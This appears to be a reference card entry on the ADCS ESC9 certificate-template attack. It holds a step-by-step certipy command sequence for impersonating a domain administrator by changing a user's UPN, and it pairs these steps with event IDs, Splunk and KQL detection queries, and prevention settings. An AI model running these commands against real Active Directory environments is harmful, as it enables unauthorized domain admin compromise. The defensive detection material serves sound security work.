name: ADCS ESC9 - No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)
description: ESC9 exploits the CT_FLAG_NO_SECURITY_EXTENSION flag (msPKI-Enrollment-Flag 0x80000) which prevents the szOID_NTDS_CA_SECURITY_EXT from being embedded in the certificate. This security extension maps the certificate to the requestor. Without it, combined with StrongCertificateBindingEnforcement=1 (not 2), you can request a certificate and use it to authenticate as another user by modifying the userPrincipalName first.
notes:
=== CONDITIONS ===
1. Template has CT_FLAG_NO_SECURITY_EXTENSION (0x80000) in msPKI-Enrollment-Flag
2. Template allows client authentication (EKU)
3. StrongCertificateBindingEnforcement is NOT 2 (default is 1)
4. You have GenericWrite over another user to change their UPN

=== ATTACK STEPS ===
  # Step 1 - Change victim UPN to target (e.g., admin)
  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn administrator
  # Step 2 - Request cert as victim (cert will have admin UPN)
  certipy req -u <victim>@<domain> -p <pass> -ca <ca_name> -template <vuln_template>
  # Step 3 - Restore victim UPN
  certipy account update -u <user>@<domain> -p <pass> -user <victim> -upn <victim>@<domain>
  # Step 4 - Authenticate with cert (maps to admin due to UPN)
  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

=== WHY IT WORKS ===
Without the security extension, the DC maps the certificate to the
user by UPN only. If you changed the UPN before requesting the cert,
the cert maps to whoever had that UPN.

examples.label: Change victim UPN to administrator
examples.command: certipy account update -u jdoe@corp.local -p Password123 -user victim -upn administrator

examples.label: Request certificate as victim
examples.command: certipy req -u victim@corp.local -p Password123 -ca corp-CA -template VulnTemplate

recommended.note: ESC1 is a simpler ADCS attack; ESC9 targets the security extension.
ESC15 also targets certificate mapping but via different flags.

defense.why_it_works: CT_FLAG_NO_SECURITY_EXTENSION prevents the CA from embedding the requestor SID in the certificate. Without this binding, authentication relies solely on UPN matching, which can be manipulated.
defense.prerequisites: GenericWrite on another account; vulnerable template with CT_FLAG_NO_SECURITY_EXTENSION; StrongCertificateBindingEnforcement != 2.
defense.impact: Domain admin compromise by impersonating any user via certificate-based authentication.
defense.detection: [MITRE T1649] UPN changes followed by certificate requests; Event 4738 (account modification) correlated with 4886/4887 (cert request/issue).
defense.artifacts: Event 4738 showing UPN change; Event 4886/4887 for certificate enrollment; Event 4768 with PKINIT.
defense.splunk_spl:
index=windows (EventCode=4738 AND UserPrincipalName="administrator*") OR (EventCode=4886)
| transaction SubjectUserName maxspan=10m
| where eventcount > 1
defense.sentinel_kql:
SecurityEvent
| where EventID == 4738
| where TargetUserName != "" and UserPrincipalName != ""
| project TimeGenerated, SubjectUserName, TargetUserName, UserPrincipalName
defense.prevention: Set StrongCertificateBindingEnforcement to 2; remove CT_FLAG_NO_SECURITY_EXTENSION from templates; monitor UPN changes.

detections.name: ESC9 - UPN change followed by certificate request
detections.logic:
let upn_changes = SecurityEvent
| where EventID == 4738
| where UserPrincipalName != ""
| project ChangeTime=TimeGenerated, ChangedBy=SubjectUserName, TargetAccount=TargetUserName, NewUPN=UserPrincipalName;
let cert_requests = SecurityEvent
| where EventID == 4886
| project RequestTime=TimeGenerated, Requester=SubjectUserName;
upn_changes
| join kind=inner (cert_requests) on $left.TargetAccount == $right.Requester
| where RequestTime between (ChangeTime .. (ChangeTime + 10m))
detections.false_positives: Legitimate UPN changes during account migrations
detections.tuning: Narrow time window; alert on any UPN change to privileged account names
